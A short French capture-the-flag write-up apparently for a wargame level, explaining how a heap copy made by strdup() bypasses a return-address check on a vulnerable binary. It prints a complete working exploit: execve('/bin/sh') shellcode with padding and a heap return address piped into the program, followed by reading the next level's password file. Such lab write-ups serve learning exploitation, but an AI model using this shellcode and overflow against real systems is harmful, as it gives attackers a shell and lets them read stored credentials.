# level2 - Exploitation du Heap via strdup()

## Analyse du Programme

**Structure du Programme**
- Le `main()` appelle une fonction `p()`
- La fonction `p()` vérifie si l'adresse de retour contient `0xb`
- Utilisation de `strdup()` qui alloue de la mémoire dans le heap

**Points Clés**
- Adresse de retour de `strdup()`: `0x804a008`
- Offset du buffer overflow: 80 bytes
- Shellcode length: 21 bytes
- Padding nécessaire: 59 bytes (80 - 21)

## Stratégie d'Exploitation

**Contournement de la Protection**
- Le programme vérifie si l'adresse de retour contient `0xb`
- L'utilisation du heap via `strdup()` permet de contourner cette protection
- L'exécution de code en mémoire est active

**Construction du Payload**
1. Shellcode en début de payload (21 bytes)
2. Padding de 59 bytes
3. Adresse de retour de `strdup()`

## Exploitation

**Commande d'Exploitation**
```bash
(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"'; cat) | ./level2
```

**Obtention du Flag**
```bash
cat /home/user/level3/.pass
```

Cette exploitation fonctionne car le shellcode est exécuté depuis le heap, évitant ainsi la vérification de l'adresse de retour contenant `0xb`.
